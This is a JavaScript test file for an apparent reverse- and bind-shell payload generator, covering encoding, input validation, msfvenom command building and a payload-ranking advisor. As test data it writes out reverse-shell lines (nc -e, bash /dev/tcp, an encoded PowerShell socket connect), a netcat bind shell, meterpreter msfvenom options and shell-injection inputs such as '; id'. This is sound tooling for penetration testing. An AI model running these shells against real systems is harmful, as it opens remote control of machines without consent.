import test from 'node:test'
import assert from 'node:assert/strict'

import {
  applyEncoding,
  injectPayloadValues,
} from '../src/utils/encoding.js'
import {
  quoteShellArg,
  validateBadChars,
  validateHost,
  validatePort,
} from '../src/utils/validation.js'
import {
  applyShellReplacement,
  detectPayloadInterpreter,
  supportsShellOverride,
} from '../src/utils/shells.js'
import {
  MSFVENOM_PAYLOADS,
  generateMsfvenomCommand,
  getMsfvenomCompatibilityErrors,
  isFormatCompatible,
} from '../src/data/msfvenomData.js'
import LINUX_PAYLOADS from '../src/data/payloadsLinux.js'
import WINDOWS_PAYLOADS from '../src/data/payloadsWindows.js'
import BIND_LINUX_PAYLOADS from '../src/data/payloadsBindLinux.js'
import BIND_WINDOWS_PAYLOADS from '../src/data/payloadsBindWindows.js'
import {
  buildPayloadCatalog,
  buildPayloadMetadata,
  inferPayloadCategory,
  validatePayloadMetadata,
} from '../src/features/payloadAdvisor/payloadMetadata.js'
import {
  rankPayloads,
  requirementIsAvailable,
} from '../src/features/payloadAdvisor/advisorEngine.js'
import {
  buildPayloadExplanation,
  extractPayloadPlaceholders,
} from '../src/features/payloadExplanation/explanationEngine.js'

function encodePowerShellUtf16(value) {
  return Buffer.from(value, 'utf16le').toString('base64')
}

test('encodes Unicode payloads as UTF-8 Base64', () => {
  assert.equal(
    applyEncoding('δοκιμή', 'Base64'),
    Buffer.from('δοκιμή', 'utf8').toString('base64'),
  )
})

test('injects placeholders inside PowerShell EncodedCommand payloads', () => {
  const source = '$client.Connect("{ip}",{port})'
  const template = 'powershell -e ' + encodePowerShellUtf16(source)
  const injected = injectPayloadValues(template, '192.0.2.10', '4444')
  const decoded = Buffer.from(injected.split(' ').at(-1), 'base64').toString('utf16le')

  assert.equal(decoded, '$client.Connect("192.0.2.10",4444)')
})

test('validates hosts and ports before payload generation', () => {
  assert.equal(validateHost('10.10.10.10'), '')
  assert.equal(validateHost('vpn.example.internal'), '')
  assert.match(validateHost('10.0.0.1; id'), /without spaces or shell characters/)
  assert.equal(validatePort('4444'), '')
  assert.match(validatePort('70000'), /between 1 and 65535/)
  assert.match(validatePort('4444 && id'), /number/)
})

test('validates bad-character syntax and safely quotes shell arguments', () => {
  assert.equal(validateBadChars('\\x00\\x0a'), '')
  assert.match(validateBadChars('\\x0z'), /byte escapes/)
  assert.equal(quoteShellArg('shell.exe'), 'shell.exe')
  assert.equal(quoteShellArg('my shell.exe'), "'my shell.exe'")
})

test('only applies shell overrides to portable payload templates', () => {
  const template = 'nc 192.0.2.1 4444 -e /bin/sh'
  assert.equal(supportsShellOverride(template, 'nc -e', 'Linux'), true)
  assert.equal(
    applyShellReplacement(template, '/bin/zsh', 'Linux'),
    'nc 192.0.2.1 4444 -e /bin/zsh',
  )
  assert.equal(supportsShellOverride('bash -i >& /dev/tcp/x/1', 'Bash -i', 'Linux'), false)
  assert.deepEqual(
    detectPayloadInterpreter('bash -i >& /dev/tcp/x/1', 'Bash -i', 'Linux'),
    { value: 'bash', label: 'Bash' },
  )
})

test('MSFVenom catalog contains no duplicate payload entries', () => {
  const payloads = Object.values(MSFVENOM_PAYLOADS)
    .flatMap(category => Object.values(category).flat())
  assert.equal(new Set(payloads).size, payloads.length)
})

test('rejects incompatible MSFVenom combinations', () => {
  assert.equal(isFormatCompatible('windows/x64/meterpreter_reverse_tcp', 'exe'), true)
  assert.equal(isFormatCompatible('windows/x64/meterpreter_reverse_tcp', 'elf'), false)
  assert.match(
    getMsfvenomCompatibilityErrors({
      payload: 'windows/x64/meterpreter_reverse_tcp',
      format: 'exe',
      encoder: 'x86/shikata_ga_nai',
      arch: 'x86',
      platform: 'linux',
    }).encoder,
    /cannot encode/,
  )
})

test('quotes user-controlled MSFVenom output values', () => {
  const command = generateMsfvenomCommand({
    payload: 'windows/x64/meterpreter_reverse_tcp',
    ip: '192.0.2.10',
    port: '4444',
    format: 'exe',
    encoder: '',
    iterations: '1',
    badChars: '\\x00',
    arch: '',
    platform: '',
    nops: '0',
    outputFile: 'my shell.exe',
  })

  assert.match(command, /-b '\\x00'/)
  assert.match(command, /-o 'my shell\.exe'/)
})

test('builds deterministic metadata for fixed and portable shell payloads', () => {
  const bashMetadata = buildPayloadMetadata({
    name: 'Bash -i',
    template: LINUX_PAYLOADS['Bash -i'],
    os: 'Linux',
    mode: 'reverse',
  })
  const netcatMetadata = buildPayloadMetadata({
    name: 'nc -e',
    template: LINUX_PAYLOADS['nc -e'],
    os: 'Linux',
    mode: 'reverse',
  })

  assert.equal(bashMetadata.id, 'reverse:linux:Bash%20-i')
  assert.deepEqual(bashMetadata.interpreter, { value: 'bash', label: 'Bash' })
  assert.equal(bashMetadata.shellOverrideSupported, false)
  assert.ok(bashMetadata.requiredBinaries.includes('bash'))
  assert.match(bashMetadata.warnings.join(' '), /\/dev\/tcp/)

  assert.equal(netcatMetadata.category, 'Netcat')
  assert.equal(netcatMetadata.shellOverrideSupported, true)
  assert.ok(netcatMetadata.requiredBinaries.includes('nc'))
})

test('builds valid metadata for every selectable reverse and bind payload', () => {
  const catalog = buildPayloadCatalog([
    { payloads: LINUX_PAYLOADS, os: 'Linux', mode: 'reverse' },
    { payloads: WINDOWS_PAYLOADS, os: 'Windows', mode: 'reverse' },
    { payloads: BIND_LINUX_PAYLOADS, os: 'Linux', mode: 'bind' },
    { payloads: BIND_WINDOWS_PAYLOADS, os: 'Windows', mode: 'bind' },
  ])

  assert.equal(catalog.length, 116)
  assert.equal(new Set(catalog.map(item => item.id)).size, catalog.length)
  assert.equal(catalog.some(item => item.name === 'P0wny Shell (Webshell)'), false)
  assert.deepEqual(catalog.flatMap(validatePayloadMetadata), [])
})

test('metadata inference supports explicit overrides and rejects duplicate ids', () => {
  const metadata = buildPayloadMetadata({
    name: 'Custom TCP',
    template: 'custom-client {ip} {port}',
    os: 'Linux',
    mode: 'reverse',
    overrides: {
      category: 'Custom',
      requiredBinaries: ['custom-client'],
      explanation: { summary: 'A locally defined custom client.' },
    },
  })

  assert.equal(metadata.category, 'Custom')
  assert.deepEqual(metadata.requiredBinaries, ['custom-client'])
  assert.equal(metadata.explanation.summary, 'A locally defined custom client.')
  assert.equal(inferPayloadCategory('Unknown payload'), 'Other')

  assert.throws(() => buildPayloadCatalog([
    { payloads: { Duplicate: 'first {ip} {port}' }, os: 'Linux', mode: 'reverse' },
    { payloads: { Duplicate: 'second {ip} {port}' }, os: 'Linux', mode: 'reverse' },
  ]), /Duplicate payload metadata id/)
})

test('advisor ranks compatible payloads deterministically', () => {
  const catalog = buildPayloadCatalog([
    { payloads: LINUX_PAYLOADS, os: 'Linux', mode: 'reverse' },
  ])
  const firstRun = rankPayloads(catalog, {
    transport: 'tcp',
    category: 'Bash',
    capabilities: ['bash'],
  })
  const secondRun = rankPayloads(catalog, {
    transport: 'tcp',
    category: 'Bash',
    capabilities: ['bash'],
  })
  const defaultRanking = rankPayloads(catalog)

  assert.ok(firstRun.length > 0)
  assert.equal(defaultRanking[0].payload.category, 'Bash')
  assert.deepEqual(
    firstRun.map(result => result.payload.id),
    secondRun.map(result => result.payload.id),
  )
  assert.equal(firstRun[0].status === 'unavailable', false)
})

test('advisor explains missing target requirements', () => {
  const catalog = [buildPayloadMetadata({
    name: 'nc -e',
    template: LINUX_PAYLOADS['nc -e'],
    os: 'Linux',
    mode: 'reverse',
  })]
  const [result] = rankPayloads(catalog, { capabilities: ['bash'] })

  assert.equal(result.status, 'unavailable')
  assert.ok(result.missingRequirements.includes('nc'))
  assert.match(result.cautions[0], /Missing/)
  assert.equal(requirementIsAvailable('python-or-python3', ['python3']), true)
})

test('advisor transport and category filters only return matching payloads', () => {
  const catalog = buildPayloadCatalog([
    { payloads: LINUX_PAYLOADS, os: 'Linux', mode: 'reverse' },
  ])
  const results = rankPayloads(catalog, { transport: 'udp', category: 'Bash' })

  assert.ok(results.length > 0)
  assert.ok(results.every(result => result.payload.transport === 'udp'))
  assert.ok(results.every(result => result.payload.category === 'Bash'))
})

test('builds guided reverse payload explanations with placeholders and stabilization', () => {
  const metadata = buildPayloadMetadata({
    name: 'Bash -i',
    template: LINUX_PAYLOADS['Bash -i'],
    os: 'Linux',
    mode: 'reverse',
  })
  const explanation = buildPayloadExplanation(metadata, {
    listenerCommand: 'nc -lvnp 4444',
  })

  assert.deepEqual(extractPayloadPlaceholders(metadata.template), ['ip', 'port'])
  assert.match(explanation.direction, /outbound connection/)
  assert.equal(explanation.workflow[0].command, 'nc -lvnp 4444')
  assert.equal(explanation.stabilization.length, 2)
  assert.match(explanation.troubleshooting, /\/dev\/tcp/)
})

test('builds bind explanations with the connect command in the correct workflow step', () => {
  const metadata = buildPayloadMetadata({
    name: 'nc bind',
    template: 'nc -lvnp {port} -e /bin/sh',
    os: 'Linux',
    mode: 'bind',
  })
  const explanation = buildPayloadExplanation(metadata, {
    listenerCommand: 'nc 192.0.2.10 4444',
  })

  assert.match(explanation.direction, /opens a listening port/)
  assert.equal(explanation.workflow[1].command, 'nc 192.0.2.10 4444')
  assert.deepEqual(explanation.stabilization, [])
})
